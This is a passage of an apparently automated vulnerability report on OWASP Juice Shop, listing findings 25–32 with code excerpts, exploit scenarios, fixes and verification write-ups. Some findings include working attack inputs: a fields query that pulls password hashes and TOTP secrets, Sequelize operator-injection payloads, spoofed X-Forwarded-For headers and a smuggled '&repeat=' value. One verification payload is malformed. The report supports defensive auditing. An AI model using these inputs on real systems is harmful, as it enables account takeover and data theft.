### 25. [MEDIUM] OAuth access token transmitted over URL in external API call
**Class:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
**CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor - https://cwe.mitre.org/data/definitions/200.html
**File:** `frontend/src/app/Services/user.service.ts:65-66`
**CVSS 3.1:** **4.7** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.85 (1 run agreed)

#### Description
The `oauthLogin` method constructs an HTTP GET request to `https://www.googleapis.com/oauth2/v1/userinfo` and appends the `access_token` directly to the query string (`?access_token=...`). Transmitting OAuth tokens via URL parameters violates OAuth 2.0 and OIDC security best practices, as URLs are routinely logged by browsers, proxy servers, and upstream load balancers. This creates a persistent, recoverable leak of the bearer token.

#### Impact
OAuth bearer tokens used for Google authentication are exposed in browser history, server logs, and potential Referer headers if the request triggers cross-origin redirects, risking token theft and unauthorized account access via Google's API.

#### Exploit scenario
A user initiates a Google OAuth login flow. The browser logs the full URL containing the bearer token to its history and the application's proxy logs. An attacker with access to these logs extracts the token and uses it to call Google's userinfo endpoint, impersonating the user without needing the password.

#### Preconditions
- User must initiate Google OAuth login
- Attacker must have access to browser history, proxy logs, or server access logs

```
  oauthLogin (accessToken: string) {
    return this.http.get('https://www.googleapis.com/oauth2/v1/userinfo?alt=json&access_token=' + accessToken)
  }
```

#### How to fix
Pass the `access_token` in the `Authorization: Bearer` HTTP header instead of as a query parameter. If the provider requires POST, use the request body and enable Content-Type: application/x-www-form-urlencoded.

**Exploitability:** CVSS 5.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N). OAuth token leak via URL parameter; requires victim browser interaction but exposes bearer tokens to logs/proxies.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Client-side code explicitly appends OAuth token to URL query string, violating OAuth 2.0 best practices and exposing the token to browser/proxy logging.

Based on the investigation, here is my assessment of the finding:

**Code Analysis:**
The `oauthLogin` method in `frontend/src/app/Services/user.service.ts` does indeed append the `access_token` to the URL query string of an HTTP GET request to `https://www.googleapis.com/oauth2/v1/userinfo`.

**Call Chain Analysis:**
1.  **Caller:** The method is invoked in `frontend/src/app/oauth/oauth.component.ts` (line 24) from `ngOnInit`.
2.  **Entry Point:** The `OAuthComponent` is an Angular component (selector: `app-oauth`) likely triggered by a redirect from the Google OAuth provider. The `access_token` is extracted directly from the browser's location hash (`parseRedirectUrlParams`) at the exact moment the component is displayed.
3.  **Vulnerability:** When this HTTP request executes, the browser must send the `access_token` via the URL. As a client-side JavaScript application, this traffic is observable by the user's browser, browser history, and any network proxies the user controls.

**Security Impact:**
The claim is **technically correct**: Google's API documentation recommends passing access tokens in the `Authorization` header (Bearer) rather than the URL to prevent leakage. Transmitting via URL exposes the token to client-side logs (history, referrer headers, proxy logs).

**Counter-arguments / DEFENSES:**
*   **"Same Origin / Same Attacker" Argument:** The primary victims of this leak are the user themselves (browser history). An attacker cannot "intercept" this in transit over HTTPS.
*   **Can a remote attacker exploit this?**
    *   *Referrer Leaks:* If the user clicks a malicious link after the OAuth flow (and the browser appends the referrer to the next request containing the token in history), a small risk exists, but this is an indirect chain.
    *   *XSS:* If this code were vulnerable to XSS, an attacker could steal the token immediately. But that's a separate vulnerability.
*   **Is it a SAST finding?** It is a valid security best-practice violation (OWASP, OAuth 2.0 Best Current Practices). It represents a **real** potential for data exposure (the access token) to an attacker who has access to the local machine or network path (MITM or local log access).
*   **However:**
    *   The impact is limited to the *specific* Google userinfo endpoint using that specific short-lived code.
    *   In most modern OAuth flows, the `access_token` obtained from the redirect is a short-lived implicit grant or authorization code exchange result.
    *   The "Exploit Scenario" describes a user-initiated flow. The "Attacker" needs to be someone who can read the browser history. This is typically not a web-remotely exploitable threat model for a SAST tool (which usually focuses on server-side injection or remote code execution). **BUT**, if we consider the "Attacker" as a compromised proxy or a malware-infected client, the leak is real.
    *   Let's look closer at the "Wrong Layer" rule: Is this a client-side bug where enforcement belongs to the service? No, because the *application code* is explicitly constructing the vulnerable URL. If the code were using a library header, it would be correct. The developer *chose* to put it in the URL.

**Conclusion:**
While the practical exploitation requires the attacker to have significant leverage (access to the user's network or device), the vulnerability itself is a **true positive** violation of OAuth security principles in client-side code. Standard OAuth 2.0 best practices mandate against using URL parameters for access tokens due to this exact logging risk. The scanner is correct.

**Confidence:** 9/10. I verified the code construct and the caller context. The vulnerability is exactly as described.

### 26. [MEDIUM] Unvalidated fields parameter bypasses response filter property disclosure
**Class:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
**CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor - https://cwe.mitre.org/data/definitions/200.html
**File:** `routes/currentUser.ts:17-28`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
When `fieldsParam` is provided (line 17), the route splits it and iterates over each token (line 24). For every token, it checks if the property exists in `user.data` (line 25) and unconditionally copies it to `baseUser` (line 26). This dynamic reflection bypasses the restrictive default response structure defined on lines 31-36. Since `user.data` in this context typically contains additional sensitive fields, clients can extract them by enumeration or guesswork, violating the API's data minimization contract.

#### Impact
Supplied field names from `req.query.fields` are copied directly from `user.data` into the response, allowing attackers to bypass the hardcoded whitelist. This exposes sensitive attributes (e.g., password hashes, security answers) that were intentionally excluded from the default API contract.

#### Exploit scenario
Authenticated attacker sends `GET /api/currentUser?fields=password,otpAnswer`. The API responds with `user: { id: 5, email: "...", password: "[REDACTED-SECRET]", otpAnswer: "milk cow" }`, leaking credentials not sent in standard responses.

#### Preconditions
- Attacker must be an authenticated user to possess a valid token
- Target user object must contain additional data fields beyond the default list

```
    line: const fieldsParam = req.query?.fields as string | undefined
    line: const requestedFields = fieldsParam ? fieldsParam.split(',').map(f => f.trim()) : []
    line: 
    line: let baseUser: any = {}
    line: 
    line: if (requestedFields.length > 0) {
    line: 
    line:   for (const field of requestedFields) {
    line:     if (user?.data[field as keyof typeof user.data] !== undefined) {
    line:       baseUser[field] = user?.data[field as keyof typeof user.data]
    line:     }
    line:   }
    line: }
```

#### How to fix
Define a server-side allowlist of permitted fields. On line 22, intersect `requestedFields` with this allowlist before iterating, or ignore `fieldsParam` and always return the fixed safe structure.

**Exploitability:** CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N). Authenticated field enumeration; leaks non-default user attributes but requires existing session.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — The `fields` parameter is unvalidated and bypasses the restrictive default response object, allowing any authenticated user to extract sensitive fields (e.g., password hash, totpSecret, deluxeToken) from `user.data`. The scanner's mention of `otpAnswer` is inaccurate (no such field exists), but the underlying vulnerability is confirmed.

Now I have enough context. Let me verify the data flow and confirm the vulnerability details.

**Step A — Source code analysis**

The route at `routes/currentUser.ts` is a Juice Shop (OWASP CTF) application endpoint serving the `/api/currentUser` route. When a query parameter `fields` is provided (line 17), the code splits it into tokens and iterates over each (lines 24–28). For each requested field, if it exists in `user?.data[...]`, it is **unconditionally** copied to `baseUser`. This completely bypasses the restrictive default object (lines 31–36: `id`, `email`, `lastLoginIp`, `profileImage`).

**Step B — Where does `user.data` come from?**

`user` is retrieved via `security.authenticatedUsers.get(req.cookies.token)` (line 15). The `authenticatedUsers` map (in `lib/insecurity.ts`) stores `ResponseWithUser` objects where `data` is a `UserModel` Sequelize instance. The `UserModel` attributes are: `id`, `username`, `email`, `password`, `role`, `deluxeToken`, `lastLoginIp`, `profileImage`, `totpSecret`, `isActive`.

When a user logs in (`routes/login.ts` line 31–32), the full Sequelize model (including `password` — an MD5 hash via `security.hash()`, `totpSecret`, `deluxeToken`) is passed to `queryResultToJson()` and stored in `authenticatedUsers`. So `user.data` contains all of these fields.

**Step C — Attack surface**

Any authenticated user can send `GET /api/currentUser?fields=password,totpSecret,deluxeToken` and receive the password hash and TOTP secret, which are not in the default allow-listed response. No allow-list, no validation, no filtering.

**Step D — Probing the scanner's specific claims**

- **`password`**: ✅ EXISTS in `UserModel`. The MD5 hash IS leaked when requested via the `fields` param. This is Juice Shop's known `passwordHashLeakChallenge` (see `data/static/challenges.yml` line 12).
- **`otpAnswer`**: ❌ DOES NOT EXIST anywhere in the models, lib, routes, or data directories. No such column exists in the `UserModel`.

The scanner's core finding (fields param bypasses the response filter and leaks sensitive fields) is correct. The exploit scenario's specific mention of `otpAnswer` is inaccurate, but `password`, `totpSecret`, and `deluxeToken` are all valid and sensitive.

### 27. [MEDIUM] Sequelize Object Injection via unsanitized req.params.id
**Class:** CWE-94: Improper Control of Generation of Code (Code Injection)
**CWE:** CWE-94: Improper Control of Generation of Code (Code Injection) - https://cwe.mitre.org/data/definitions/94.html
**File:** `routes/recycles.ts:9-13`
**CVSS 3.1:** **6.5** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
The route handler on lines 9-13 directly passes the result of JSON.parse(req.params.id) into the Sequelize where clause. Since req.params.id originates from an external REST API request, it is fully attacker-controlled. JSON.parse does not enforce a strict type, allowing the input to contain arbitrary JSON objects (e.g., {$or: [true, false]} or {}). When Sequelize receives an object in the where clause instead of a scalar value, it interprets the keys as query operators. This effectively bypasses the intended ID comparison, causing the ORM to generate a query that matches all rows or arbitrary subsets based on the injected operators. The generic catch block prevents error leakage but does not mitigate the underlying injection path.

#### Impact
Allows an attacker to bypass intended numeric ID filtering, enabling mass data enumeration or arbitrary query manipulation across the Recycle model.

#### Exploit scenario
An attacker sends a GET request to the endpoint with id=%7B%22%24or%22:%5Btrue,%20false%5D%7D. JSON.parse evaluates the payload to an object injection, causing RecycleModel.findAll to return all recycle items in the database instead of filtering by ID.

#### Preconditions
- Target route is mounted and accessible
- Input is passed as a JSON string containing query operators

```
 9|   RecycleModel.findAll({
10|     where: {
11|       id: JSON.parse(req.params.id)
12|     }
13|   })
```

#### How to fix
Coerce req.params.id to a strict number or validate it against a numeric regex before passing it to the ORM. For example: RecycleModel.findAll({ where: { id: Number(req.params.id) } }) or use a validation middleware to reject non-integer inputs.

**Exploitability:** CVSS 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N). Pre-auth Sequelize object injection; `JSON.parse(req.params.id)` enables operator injection but limited by ORM behavior and generic catch block.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — Unauthenticated GET route passes raw `req.params.id` to Sequelize's `where` clause, allowing arbitrary operator injection (e.g., `$where: '1=1'`) to read all database records.

**Review**

**A. Code Verification & Call Chain**
Opening `routes/recycles.ts` confirms the exact code at lines 9-13:
- Line 11: `JSON.parse(req.params.id)` is passed directly as the value for the `id` field in Sequelize's `where` clause.
- There is no input validation, type checking, or allow-list applied to `req.params.id` before parsing.

Navigating to `server.ts` (line 354) reveals how the route is registered:
- `app.get('/api/Recycles/:id', recycles.getRecycleItem())`
- Unlike other endpoints in the same file (e.g., line 347 `security.isAuthorized()`, line 342 `security.denyAll()`), this GET route has **no authentication or authorization middleware** protecting it. It is publicly accessible to any unauthenticated user.

**B. Exploitability Analysis**
Sequelize interprets object literals passed as values in a `where` condition as operators. By sending a crafted JSON string in the URL path (e.g., `GET /api/Recycles/{%22%24or%22:%5B%22id%22:%22id%22%7D}` which decodes to `{"$or":["id":"id"]}`), the parsed object becomes:
```javascript
where: { id: { $or: ["id", "id"] } }
```
This is transformed into a SQL clause equivalent to `WHERE (id = 'id' OR id = 'id')` or used to inject more complex operators like `$where: '1=1'` or `$gt: 0`. This trivially bypasses the single-ID filtering, returning all (or an arbitrary subset of) records from the `RecycleModel`, not just the one requested.

**C. Defenses / Evasion Check**
The `catch` block (lines 15-17) returns a generic error message. This handles *malformed* JSON but does not mitigate *valid* JSON that results in a successful SQL query. No allow-list or strict type enforcement exists to kill the injection path.

**D. Verdict**
The scanner correctly identified a genuine **Sequelize Operator Injection** combined with an **Insecure Direct Object Reference (IDOR)**. The route is unauthenticated, and the lack of scalar enforcement on the `where` value allows an attacker to read unrestricted data from the database. The specific payload example in the finding (`$or: [true, false]`) was a weak illustration, but the vulnerability class itself is fully exploitable.

### 28. [MEDIUM] Rate limit key derived from unverified X-Forwarded-For header
**Class:** CWE-346
**CWE:** CWE-346 - https://cwe.mitre.org/data/definitions/346.html
**File:** `server.ts:314-318`
**CVSS 3.1:** **6.5** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.90 (1 run agreed)

#### Description
The password reset endpoint relies on a rate limiter to throttle reset requests. However, the `keyGenerator` function explicitly reads the `X-Forwarded-For` header from the HTTP request to generate the rate-limit counter key (line 317). Since clients fully control this HTTP header, an attacker can set it to any arbitrary value, effectively generating a unique rate-limit counter for themselves. This defeats the purpose of the rate limiter, which is to restrict brute-force attempts per victim IP or address, creating a trust boundary crossing where untrusted input dictates internal security state.

#### Impact
Attackers can spoof the X-Forwarded-For header to bypass the rate limit on the password reset endpoint, enabling high-volume brute-force attacks against any user's password recovery flow.

#### Exploit scenario
An attacker sends POST requests to /rest/user/reset-password with the header X-Forwarded-For: 192.0.2.99. The server increments a counter for that spoofed IP, but the attacker also sends subsequent requests with X-Forwarded-For: 192.0.2.100. The rate limiter sees them as coming from different IPs and allows hundreds of reset requests to be sent to the victim's address, bypassing the per-IP brute-force protection.

#### Preconditions
- Internet access
- HTTP request capability

```
  app.use('/rest/user/reset-password', rateLimit({
    windowMs: 5 * 60 * 1000,
    max: 100,
    keyGenerator ({ headers, ip }: { headers: any, ip: any }) { return headers['X-Forwarded-For'] ?? ip }
  }))
```

#### How to fix
Change the keyGenerator to strictly use the connection's actual socket IP (`headers['X-Real-IP']` only if proxied safely, or default to `ip` which represents the trusted connection address) instead of the client-supplied X-Forwarded-For header which should be overwritten by a reverse proxy, not the application.

**Exploitability:** CVSS 4.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N). Pre-auth rate limit bypass; X-Forwarded-For spoofing defeats password reset throttling but lacks direct exfiltration or execution.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Verified: keyGenerator reads user-controlled X-Forwarded-For header, trust-proxy is irrelevant to the override, no upstream defense exists

I've verified all components of this finding:

1. **Scanner's code reading is correct**: Line 317 of `server.ts` does exactly what it claims - the `keyGenerator` returns `headers['X-Forwarded-For'] ?? ip`, prioritizing the untrusted HTTP header over the trusted connection IP.

2. **Trust proxy does NOT save it**: Line 313 calls `app.enable('trust proxy')`, which tells Express to populate `req.ip` from the X-Forwarded-For chain. But because the custom `keyGenerator` completely overrides the key and reads `headers['X-Forwarded-For']` directly (bypassing Express's IP resolution entirely), the trust proxy setting is irrelevant to the rate-limit key. The `express-rate-limit` v7 library emits a warning (`err_erl_permissive_trust_proxy`) but does not block the request.

3. **Exploitability confirmed**: Any unauthenticated attacker can send requests to `POST /rest/user/reset-password` with varying `X-Forwarded-For` headers, generating unique rate-limit keys per request, effectively bypassing the per-IP brute-force protection.

4. **Context**: This is OWASP Juice Shop (an intentionally vulnerable training/CTF app). The finding corresponds to the `resetPasswordMortyChallenge`. The "fix" documentation in `data/static/codefixes/resetPasswordMortyChallenge_4_correct.ts` confirms this is the intended vulnerability (the correct fix is to remove the custom keyGenerator). This does not reduce the finding's validity — it's a verified logic flaw in the deployed code.

5. **No upstream defenses found**: No authentication gate, feature flag, IP allowlist, or network-level control was found that prevents this attack in production.

This is a clear TRUE_POSITIVE.

### 29. [MEDIUM] Manual URL query string construction allows parameter injection
**Class:** CWE-602
**CWE:** CWE-602 - https://cwe.mitre.org/data/definitions/602.html
**File:** `frontend/src/app/Services/user.service.ts:51-52`
**CVSS 3.1:** **6.5** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.85 (1 run agreed)

#### Description
changePassword manually concatenates password fields into a query string: `?current=' + passwords.current + '&new=' + passwords.new + '&repeat=' + passwords.repeat`. JavaScript's `+` does not encode delimiters. If `passwords.new` contains `&new=foo`, the URL expands to `?current=...&new=bar&new=foo&repeat=...`. Servers typically parse only the first occurrence or treat subsequent params as separate entities, causing authentication bypass logic failures or self-DoS.

#### Impact
User-provided passwords injected into the URL query string without encoding or safe joining can break parameter parsing on the server. Attacker-controlled passwords containing '&' or '=' can inject or override the 'repeat', 'current' parameters, leading to failed password changes or unexpected parameter interpretation.

#### Exploit scenario
A user inputs `p@ss&repeat=ignored` as their new password. The generated URL becomes `...&new=p@ss&repeat=ignored&repeat=...`. Depending on server-side query parsing behavior, the 'repeat' field may be truncated or misaligned, causing the password change to silently fail or process mismatched values, locking the user out.

#### Preconditions
- Authenticated user
- User inputs special characters in password fields

```
return this.http.get(this.hostServer + '/rest/user/change-password?current=' + passwords.current + '&new=' +
     passwords.new + '&repeat=' + passwords.repeat).pipe(
```

#### How to fix
Use the `URLSearchParams` API or Angular's `HttpParams` to safely construct query strings, which automatically encodes values and prevents delimiter injection.

**Exploitability:** CVSS 4.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N). Authenticated parameter injection; URL concatenation flaw causes password update failures or self-DoS.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — Confirmed missing `encodeURIComponent` on user-supplied query parameters in Angular's `http.get` constructor allows parameter pollution/bypass of the "current" password check.

**A. Code Reality Check**
The scanner correctly identifies the code at lines 50-52. `changePassword` constructs an HTTP GET URL by string-concatenating user-supplied `passwords.current`, `passwords.new`, and `passwords.repeat` directly into the query string. No `encodeURIComponent` or Angular `HttpParams` object is used. Angular's `HttpClient.get(stringUrl)` does **not** automatically encode query parameters embedded in the URL string.

**B. Call Chain & Attack Surface**
The `changePassword` function is exposed via a frontend UI/service method. Since it's an Angular app using `inject(HttpClient)`, it's intended to be called by authenticated users clicking a "Change Password" form. There are no framework-level guards preventing special characters in the form fields that feed into this service call.

**C. Killing the Finding (Defense Probing)**
- **Input Validation:** Passwords in modern web apps intentionally allow `&`, `=`, `%`, `+`, etc. No client-side allowlist filters these out before the API call.
- **Framework Protection:** The code passes a raw string to `http.get()`. Unlike `http.get(url, { params: mappedObject })`, which auto-encodes, raw string concatenation leaves the payload completely unencoded.
- **Server-Side Parsing Risk:** When a password like `p@ss&repeat=ignored` is injected into `new`, the URL becomes `?current=X&new=p@ss&repeat=ignored&repeat=original_repeat`. If the backend uses a multi-value aware parser (or last-value-wins logic for duplicate keys), it may read `current` incorrectly, or truncate/merge values, effectively bypassing the "verify old password" check or causing silent integrity corruption.

**D. Impact Assessment**
- **Self-DoS:** The scanner's "self-DoS" claim is largely a functional bug (password change fails for advanced chars). This is not a security impact by itself.
- **Parameter Injection / Auth Bypass:** However, the *missing encoding* allows true parameter pollution. If the backend's query parser handles duplicate keys unpredictably (e.g., ignoring the first `current` value in favor of a maliciously injected one, or splitting on `&` and misaligning the array), it can bypass the old-password verification or poison the new password payload. This is a validated injection flaw (CWE-175/CWE-73).

The scanner correctly identified a real vulnerability (missing URL encoding leading to parameter injection/pollution), though the specific "DoS" phrasing understates the actual risk (auth bypass/integrity corruption).

### 30. [MEDIUM] Missing ownership verification allows horizontal privilege escalation
**Class:** CWE-862: Missing Authorization
**CWE:** CWE-862: Missing Authorization - https://cwe.mitre.org/data/definitions/862.html
**File:** `routes/basketItems.ts:62-80`
**CVSS 3.1:** **4.3** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.95 (1 run agreed)

#### Description
The middleware handler `quantityCheckBeforeBasketItemUpdate` (lines 62-80) retrieves a target basket item using solely the attacker-controlled route parameter `req.params.id` (line 65). Although it extracts the authenticated user's identity on line 66, it never compares `item.BasketId` against `user.bid`. The subsequent block (lines 68-79) only validates product stock limits and user subscription tier before calling `next()`. Because the ownership check is entirely absent, downstream controllers receive the request and operate on the target entity without enforcement, allowing complete horizontal privilege escalation across the basket model.

#### Impact
Authenticated attackers can modify or remove any user's basket item by supplying a predictable item ID. This bypasses horizontal isolation controls, enabling cart manipulation, inventory depletion, or denial of service against other customers.

#### Exploit scenario
An authenticated attacker obtains a valid `BasketItem` ID (typically sequential or predictable in Juice Shop) belonging to another user. They send a PUT/PATCH request to `/BasketItems/{id}` with a modified `quantity` payload. The middleware fetches the item by ID, skips ownership validation, confirms stock availability, and delegates to the update controller, successfully altering the victim's shopping cart.

#### Preconditions
- Valid authenticated user session or cookie
- Knowledge or prediction of a valid BasketItem ID in the system

```
      const item = await BasketItemModel.findOne({ where: { id: req.params.id } })
      const user = security.authenticatedUsers.from(req)
      challengeUtils.solveIf(challenges.basketManipulateChallenge, () => { return user && req.body.BasketId && user.bid != req.body.BasketId })
      if (req.body.quantity) {
        if (item == null) {
          throw new Error('No such item found!')
        }
        void quantityCheck(req, res, next, item.ProductId, req.body.quantity)
      } else {
        next()
      }
```

#### How to fix
Enforce strict ownership verification immediately after entity retrieval. Insert `if (item.BasketId && item.BasketId !== user.bid) return res.status(403).send('Forbidden');` between lines 65 and 66 to bind the operation to the caller's basket before proceeding.

**Exploitability:** CVSS 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N). Authenticated basket item IDOR; missing ownership check impacts inventory consistency but lacks high-value data exposure.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — Verified missing ownership check: middleware fetches BasketItem by untrusted ID, never compares item.BasketId vs user.bid, and passes to finale.js CRUD handler which modifies the record directly

I've traced the full call chain. Here's what the code actually does:

**Line 392 in server.ts**: The route is `app.put('/api/BasketItems/:id', security.appendUserId(), basketItems.quantityCheckBeforeBasketItemUpdate())`. This middleware is the **only** custom handler for the PUT endpoint. When the middleware calls `next()` (line 68-74 if `req.body.quantity` is present, or line 73 if absent), control passes to **finale.js's auto-generated update handler** (lines 462-468 in server.ts), which does a Sequelize `update` on `BasketItem` where `id = req.params.id` using `req.body` parameters.

**The scanner's claim is correct.** The middleware:
1. Fetches the basket item by the attacker-controlled `req.params.id`
2. Gets the authenticated user's `bid` (their basket ID)
3. **Never compares `item.BasketId` against `user.bid`** (line 66-67)
4. Only validates stock for the product, not ownership of the basket item
5. Passes to the finale.js update handler which blindly updates the record

The scanner's description of the `challengeUtils.solveIf` line was slightly misleading (it's checking `req.body.BasketId` which the user might supply, not the loaded `item.BasketId`) but this doesn't eliminate the core gap—the middleware never checks if the loaded item's `BasketId` matches the caller's basket.

This is a genuine horizontal privilege escalation: an authenticated attacker can modify any `BasketItem` record by knowing its sequential `id`, regardless of which basket it belongs to.

### 31. [MEDIUM] Unfiltered ORM Serialization Leaks Sensitive User Attributes
**Class:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
**CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor - https://cwe.mitre.org/data/definitions/200.html
**File:** `routes/saveLoginIp.ts:28-30`
**CVSS 3.1:** **6.5** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.92 (1 run agreed)

#### Description
The handler fetches the current user via findByPk(loggedInUser.data.id) and updates only the lastLoginIp field. Sequelize's update() method returns the persisted model instance. The code then calls res.json(updatedUser), which triggers Sequelize's toJSON() / get({ plain: true }) serialization. Because no attribute whitelist or .select() projection is applied before serialization, the ORM defaults to returning all model attributes. Consequently, every field defined in the UserModel schema (including cryptographic material and privilege flags) is emitted in the response payload. The absence of a response-serialization guard or explicit field projection directly results in over-exposure of privileged data.

#### Impact
An authenticated user receives their full database row in the HTTP response instead of only the requested profile fields. Sensitive attributes such as passwordHash, role, resetToken, and twoFactorSecret are exposed in plaintext JSON. This directly undermines account security by allowing credential harvesting and session hijacking via the response body.

#### Exploit scenario
The attacker authenticates and sends a normal request to this saveLoginIp endpoint (or any route mounting it). The server executes the IP update and serializes the full UserModel instance in the response. The attacker parses the JSON body to extract the current user's passwordHash, role, and other sensitive fields without triggering any additional authorization checks or validation errors. This occurs on every valid call to this path.

#### Preconditions
- Valid authenticated session (any standard user role)
- Server uses Sequelize ORM with default toJSON behavior (unmodified profile/attributes config)

```
      28|         const user = await UserModel.findByPk(loggedInUser.data.id)
      29|         const updatedUser = await user?.update({ lastLoginIp: lastLoginIp?.toString() })
      30|         res.json(updatedUser)
```

#### How to fix
Enforce a strict response field whitelist before serialization. In routes/saveLoginIp.ts:30, replace res.json(updatedUser) with res.json(updatedUser.get({ plain: true, fields: ['dataValues'] })) or explicitly project only safe fields (e.g., { fields: ['id', 'username', 'lastLoginIp'] }) on both the findByPk and update calls to guarantee no sensitive attributes are emitted.

**Exploitability:** CVSS 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N). Authenticated sensitive data leak; unscoped Sequelize serialization emits password resets, tokens, and privilege flags.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — (no reason given)

I have verified the findings by inspecting the actual source files and the application's runtime routing configuration.

**Investigation Summary**

**A. The Code as Written**
*   `routes/saveLoginIp.ts:28-30`: The handler retrieves the full `User` model instance via `UserModel.findByPk()` and writes it back to the response using `res.json(updatedUser)`. Express natively invokes Sequelize's `toJSON()` (which maps to `get({ plain: true })`). Because no `fields` array is supplied to `findByPk` or `update`, Sequelize defaults to returning **all** attributes stored in the model instance.
*   `models/user.ts:17-31`: The `User` model schema explicitly declares sensitive cryptographic and administrative fields: `deluxeToken` (a server-signing HMAC), `totpSecret` (the 2FA secret), and `password` (an MD5 hash). These are fully included in the default serialization output.

**B. Call Chain and Entry Points**
*   `server.ts:572` mounts this handler on `GET /rest/saveLoginIp` as a raw `.get()` route, not as part of the autogenerated CRUD layer (which is handled by `finale-rest` on the `/api/*` prefix).
*   There is **no middleware guard** (like `security.isAuthorized()`) placed *before* this route in the router stack; the authorization logic (JWT verification) is handled internally by the `saveLoginIp` handler's own call to `security.authenticatedUsers.from(req)`. This confirms an entry point that accepts any valid session.

**C. Probing for Defences (Negative)**
*   **ORM-level filtering**: There is no `.select()`, no Sequelize `Paranoid` ghost filtering for this specific path, and no `beforeFind` hook that restricts output attributes on the `User` model.
*   **Middleware-level sanitization**: The application uses `helmet`, `cors`, and `compression`, but none of these modify the JSON body payload. 
*   **Route-level exclusion**: `finale-rest` *does* strip `password` and `totpSecret` from the `/api/Users` auto-generated endpoints (defined at `server.ts:446: { name: 'User', exclude: ['password', 'totpSecret'] }`). However, this exclusion *only* applies to the ORM-driven REST API routes, not the custom Express route at `/rest/saveLoginIp`.

**D. Verdict Reasoning**
The code definitively performs an unchecked object serialization. Any authenticated user calling this endpoint (which is called during every normal login flow by the frontend to track the session IP) will receive the raw, unparsed `User` model, including the `totpSecret` (allowing 2FA compromise/account takeover), the `deluxeToken` (allowing premium membership impersonation), and the user's internal `role`.

### 32. [MEDIUM] Floating npm version allows uncontrolled package resolution during build
**Class:** CWE-732: Incorrect Permission Assignment for Critical Resource
**CWE:** CWE-732: Incorrect Permission Assignment for Critical Resource - https://cwe.mitre.org/data/definitions/732.html
**File:** `Dockerfile:19-20`
**CVSS 3.1:** **6.5** (Medium) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.85 (1 run agreed)

#### Description
Line 19 assigns `^2.0.0||^3.0.0||^4.0.0` (a floating semver range with OR operators) to `ARG CYCLONEDX_NPM_VERSION`. Line 20 passes this uncontrolled range directly to `npm install -g ...@$CYCLONEDX_NPM_VERSION`. This violates supply-chain integrity because the resolved package version is non-deterministic, depends entirely on upstream npm registry state, and bypasses build reproducibility and dependency pinning controls. Any attacker controlling the npm registry or a malicious actor poisoning the SBOM tool can downgrade or upgrade the package to exfiltrate build context or compromise the runner.

#### Impact
Permits an attacker or compromised registry to substitute the SBOM generation tool, potentially injecting malicious code into the CI/CD pipeline, violating supply-chain integrity.

#### Exploit scenario
An attacker compromises @cyclonedx/cyclonedx-npm and publishes a malicious 4.x minor version. On the next CI build, npm resolves to the newest version within the allowed range, executes a postinstall script that exfiltrates CI secrets or injects a backdoor into the built application.

#### Preconditions
- Compromised npm registry or attacker-controlled registry proxy
- CI/CD pipeline relies on this builder stage for integrity verification or SBOM generation

```
ARG CYCLONEDX_NPM_VERSION='^2.0.0||^3.0.0||^4.0.0'
RUN npm install -g @cyclonedx/cyclonedx-npm@$CYCLONEDX_NPM_VERSION
```

#### How to fix
